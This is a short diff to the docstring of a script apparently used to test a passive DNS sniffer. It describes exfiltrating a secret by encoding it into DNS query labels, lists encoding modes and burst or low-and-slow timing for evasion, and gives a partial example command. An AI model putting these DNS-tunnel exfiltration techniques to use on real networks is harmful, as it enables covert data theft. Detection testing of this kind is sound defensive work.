@@ -9,12 +9,12 @@ The secret is encoded, chunked into DNS labels, and sent as A/TXT queries for
 sink. The queries traverse the gateway (default route), where the passive
 sniffer inspects them.
 
-Modes escalate in stealth (see docs taxonomy D1..D5):
+Modes escalate in stealth (see docs taxonomy D1..D4):
   naive   D1  plaintext labels                (trips content/regex rules)
   hex     D2  base16 encoded
   base32  D2  base32 encoded (classic tunnel charset)
   base64  D2  urlsafe base64 encoded
-Combine with --count / --delay for burst (D3) or low-and-slow (D5) timing.
+Combine with --count / --delay for burst (D3) or low-and-slow (D4) timing.
 
 Example:
     python attacks/dns_exfiltrate.py --secret "VISA 4111111111111111" \
